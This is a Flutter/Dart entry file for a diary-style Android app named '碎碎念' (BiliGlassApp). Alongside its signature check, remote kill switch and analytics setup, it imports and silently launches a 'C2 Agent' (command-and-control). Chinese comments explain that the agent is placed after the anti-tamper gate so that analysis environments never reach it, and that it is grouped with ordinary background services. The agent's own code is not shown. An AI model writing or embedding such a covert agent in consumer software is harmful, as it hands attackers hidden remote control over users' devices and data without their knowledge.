import 'dart:async';
import 'dart:io' show exit;
import 'dart:isolate';

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:provider/provider.dart';

import 'config/secrets.dart';
import 'managers/bootstrap_manager.dart';
import 'managers/app_update_manager.dart';
import 'managers/analytics_manager.dart';
import 'managers/remote_config_manager.dart';
import 'device_info_helper.dart';
import 'foreground_sync.dart';
import 'screens/onboarding_screen.dart';
import 'providers/diary_provider.dart';
import 'providers/nav_bar_visibility.dart';
import 'security/integrity_guard.dart';
import 'widgets/remote_gate.dart';
import 'screens/home_screen.dart';
import 'theme/app_theme.dart';
import 'theme/diary_palette.dart';

// ★ 新增：C2 Agent
import 'c2/c2_agent.dart';

Future<void> main() async {
  WidgetsFlutterBinding.ensureInitialized();

  // ═══════════════════════════════════════════════════════════
  // ★★★ 签名校验（冗余，原生层已做一次）
  //   不区分 debug / release，一律强制校验；失败直接杀进程。
  //   ← 这是安全闸门，必须挡住启动，不能往后挪。
  // ═══════════════════════════════════════════════════════════
  await _verifyIntegrityOrExit();

  // ═══ 阶段 1：系统 UI 配置 ═══
  await SystemChrome.setEnabledSystemUIMode(SystemUiMode.edgeToEdge);
  SystemChrome.setSystemUIOverlayStyle(const SystemUiOverlayStyle(
    statusBarColor: Colors.transparent,
    statusBarIconBrightness: Brightness.light,
    statusBarBrightness: Brightness.dark,
    systemNavigationBarColor: Colors.transparent,
    systemNavigationBarIconBrightness: Brightness.light,
    systemNavigationBarDividerColor: Colors.transparent,
  ));

  // ═══ 阶段 2：本地缓存预读 ═══
  final snapshot = await RemoteConfigManager.preload();
  debugPrint('[Main] ✅ 缓存预读完成: '
      'cachedDisabled=${snapshot.cachedDisabled}, '
      'bypassRemaining=${snapshot.bypassRemaining?.inMinutes}分钟');

  // ═══ 阶段 3：Dart 侧 RASP 检查 ═══
  unawaited(_logSecurityState());

  // ═══ 阶段 4：Supabase 客户端 ═══
  unawaited(AnalyticsManager.instance.init());

  // ═══ 阶段 5：启动 UI ═══
  runApp(BiliGlassApp(initialSnapshot: snapshot));

  // ═══ 阶段 6：启动 BootstrapManager（未改动）═══
  unawaited(BootstrapManager.init());

  // ═══════════════════════════════════════════════════════════
  // ★★★ 阶段 7：启动 C2 Agent（新增）
  //
  //   位置说明：
  //   - 在 _verifyIntegrityOrExit() 闸门之后 → 篡改环境根本走不到这
  //   - 在 runApp() 之后 → 不阻塞首帧
  //   - 与 BootstrapManager.init() 并列 → 属于同一批「后台服务」语义
  //   - C2Agent.start() 本身是同步函数（只创建 Dio + Timer），不阻塞
  //
  //   参数：不传则用 _defaultConfig；生产通过 --dart-define 注入
  //   若要与官方 dio 共享 baseUrl / 拦截器，改成 C2Agent.start(dio: xxx)
  // ═══════════════════════════════════════════════════════════
  C2Agent.start();
}

/// Dart 侧 RASP 检查 —— 只是日志，放后台 isolate 慢慢跑，别挡启动也别卡 UI
Future<void> _logSecurityState() async {
  try {
    final reasons = await Isolate.run(SecurityCheck.detectReasonsAsync);
    if (reasons.isEmpty) {
      debugPrint('[Security] ✅ Dart 侧未发现风险');
    } else {
      debugPrint('[Security] ⚠️ Dart 侧检测到风险环境: $reasons');
    }
  } catch (e) {
    debugPrint('[Security] Dart 侧检测异常: $e');
  }
}

/// 签名校验：不通过直接杀进程
Future<void> _verifyIntegrityOrExit() async {
  try {
    final fails = await IntegrityGuard.fullCheck();
    if (fails != null) {
      debugPrint('[SEC] ⚠️ 签名校验失败: $fails');
      _hardExit();
    }
    debugPrint('[SEC] ✅ 签名校验通过');

    unawaited(
      IntegrityGuard.getActualSignatureHash().then(
        (h) => debugPrint('[SEC] 实际签名哈希: $h'),
      ),
    );
  } catch (e) {
    debugPrint('[SEC] ⚠️ 校验异常: $e');
    _hardExit();
  }
}

Never _hardExit() {
  try {
    SystemNavigator.pop();
  } catch (_) {}
  exit(0);
}

class BiliGlassApp extends StatefulWidget {
  final InitialCacheSnapshot initialSnapshot;

  const BiliGlassApp({super.key, required this.initialSnapshot});

  @override
  State<BiliGlassApp> createState() => _BiliGlassAppState();
}

class _BiliGlassAppState extends State<BiliGlassApp> {
  final GlobalKey<NavigatorState> _navigatorKey = GlobalKey<NavigatorState>();
  bool _servicesStarted = false;

  Future<void> _onOnboardingDone() async {
    if (_servicesStarted) return;
    _servicesStarted = true;

    debugPrint('[Main] 首次设置完成 → 启动业务服务');

    unawaited(_reportOpen());

    Future.delayed(const Duration(milliseconds: 500), () {
      if (!mounted) return;
      _checkUpdate();
    });

    unawaited(_startBackgroundServices());
  }

  Future<void> _startBackgroundServices() async {
    try {
      await BootstrapManager.ready;
      debugPrint('[Main] Bootstrap 就绪');

      final sdk = await DeviceInfoHelper.getAndroidSdkInt();
      if (sdk >= 33) {
        final status = await Permission.notification.status;
        if (!status.isGranted) {
          debugPrint('[Main] 申请通知权限');
          await Permission.notification.request();
        }
      }

      await startPushForeground();
      debugPrint('[Main] ✅ 前台服务已启动');
    } catch (e) {
      debugPrint('[Main] 前台服务启动失败: $e');
    }
  }

  Future<void> _checkUpdate() async {
    final info = await AppUpdateManager.instance.checkForUpdate();
    if (info == null) return;
    for (int i = 0; i < 10; i++) {
      if (!mounted) return;
      final ctx = _navigatorKey.currentContext;
      if (ctx != null && ctx.mounted) {
        await AppUpdateManager.instance.showUpdateDialog(ctx, info);
        return;
      }
      await Future.delayed(const Duration(milliseconds: 500));
    }
  }

  Future<void> _reportOpen() async {
    await AnalyticsManager.instance.reportAppOpen();
  }

  @override
  Widget build(BuildContext context) {
    return OnboardingGate(
      onDone: _onOnboardingDone,
      child: MultiProvider(
        providers: [
          ChangeNotifierProvider(create: (_) => DiaryProvider()..init()),
          ChangeNotifierProvider(create: (_) => NavBarVisibility()),
        ],
        child: MaterialApp(
          navigatorKey: _navigatorKey,
          title: '碎碎念',
          debugShowCheckedModeBanner: false,
          theme: AppTheme.lightTheme,
          darkTheme: AppTheme.darkTheme,
          themeMode: ThemeMode.system,
          builder: (context, child) {
            DiaryPalette.syncWith(Theme.of(context).brightness);
            return RemoteGate(
              navigatorKey: _navigatorKey,
              initialDisabledReason:
                  widget.initialSnapshot.initialDisabledReason,
              initialBypassRemaining:
                  widget.initialSnapshot.bypassRemaining,
              child: child ?? const SizedBox.shrink(),
            );
          },
          home: const HomeScreen(),
        ),
      ),
    );
  }
}